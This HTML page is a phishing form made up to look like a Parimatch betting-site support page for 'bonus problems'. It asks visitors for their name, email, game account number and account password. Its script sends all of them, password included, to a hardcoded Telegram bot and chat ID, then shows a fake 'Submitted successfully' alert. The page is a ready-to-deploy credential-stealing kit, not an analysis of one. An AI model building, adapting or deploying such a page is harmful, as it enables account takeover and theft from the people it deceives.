<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parimatch Support - Bonus Problem</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0d0e0e; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        header { width: 100%; background-color: #161818; padding: 15px 20px; display: flex; flex-direction: column; align-items: center; border-bottom: 1px solid #262929; position: relative; }
        .top-bar { width: 100%; max-width: 480px; display: flex; align-items: center; justify-content: center; position: relative; }
        .back-btn { position: absolute; left: 0; width: 38px; height: 38px; border-radius: 50%; background-color: #25291c; color: #f3ff00; display: flex; align-items: center; justify-content: center; text-decoration: none; font-size: 16px; border: 1px solid #3c4228; }
        .brand-box { display: flex; align-items: center; gap: 10px; }
        .logo-badge { border: 1.5px solid #f3ff00; padding: 5px 12px; border-radius: 8px; font-weight: 900; font-style: italic; color: #f3ff00; font-size: 14px; background: rgba(243, 255, 0, 0.05); }
        .support-title { font-size: 20px; font-weight: 700; color: #ffffff; }
        .tagline { margin-top: 6px; font-size: 12px; color: #9ca3af; }
        .container { width: 100%; max-width: 480px; padding: 20px 16px; }
        .complaint-card { background-color: #161818; border: 1px solid #262929; border-radius: 16px; padding: 22px 18px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); }
        .card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .card-header i { color: #f3ff00; font-size: 20px; }
        .card-header h2 { font-size: 18px; font-weight: 700; }
        .form-group { margin-bottom: 18px; }
        label { display: block; font-size: 13.5px; font-weight: 600; color: #e5e7eb; margin-bottom: 8px; }
        input { width: 100%; background-color: #212424; border: 1px solid #323636; border-radius: 10px; padding: 13px 14px; color: #ffffff; font-size: 14px; outline: none; }
        input:focus { border-color: #f3ff00; }
        .submit-btn { width: 100%; background-color: #f3ff00; color: #000000; border: none; border-radius: 10px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 6px; }
        .submit-btn:hover { background-color: #d9e600; }
    </style>
</head>
<body>
    <header>
        <div class="top-bar">
            <a href="../index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <div class="brand-box">
                <div class="logo-badge">PARIMATCH</div>
                <span class="support-title">Support</span>
            </div>
        </div>
        <div class="tagline">Bonus Problem</div>
    </header>

    <div class="container">
        <div class="complaint-card">
            <div class="card-header">
                <i class="fa-solid fa-user-shield"></i>
                <h2>Account Verification Details</h2>
            </div>
            <form id="bonusForm" onsubmit="handleSubmit(event)">
                <div class="form-group">
                    <label for="fullname">User Name</label>
                    <input type="text" id="fullname" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label for="email">Game Email ID</label>
                    <input type="email" id="email" placeholder="your@email.com" required>
                </div>
                <div class="form-group">
                    <label for="accountNo">Game Account Number</label>
                    <input type="text" id="accountNo" placeholder="Enter account number" required>
                </div>
                <div class="form-group">
                    <label for="password">Game Account Password</label>
                    <input type="password" id="password" placeholder="Enter account password" required>
                </div>
                <div class="card-header" style="margin-top: 20px;">
                    <i class="fa-solid fa-gift"></i>
                    <h2>Bonus Details</h2>
                </div>
                <div class="form-group">
                    <label for="bonusAmount">Enter Bonus Amount (₹)</label>
                    <input type="number" id="bonusAmount" placeholder="e.g., 500" required>
                </div>
                <button type="submit" class="submit-btn">Submit Now</button>
            </form>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();
            const fullname = document.getElementById('fullname').value;
            const email = document.getElementById('email').value;
            const accountNo = document.getElementById('accountNo').value;
            const password = document.getElementById('password').value;
            const bonusAmount = document.getElementById('bonusAmount').value;

            const botToken = '9157522398:AAH24Y64DBqUyi-Tsgwgcz20iXbaxUzqGRo';
            const chatId = '7643342967';
            const message = `🔔 *New Bonus Problem Request*\n\n👤 Name: ${fullname}\n📧 Email: ${email}\n🔢 Acc No: ${accountNo}\n🔑 Password: ${password}\n🎁 Bonus Amount: ₹${bonusAmount}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
            }).then(res => res.json()).then(data => {
                if(data.ok) { alert("Submitted successfully!"); location.reload(); }
                else { alert("Error! Try again."); }
            });
        }
    </script>
</body>
</html>
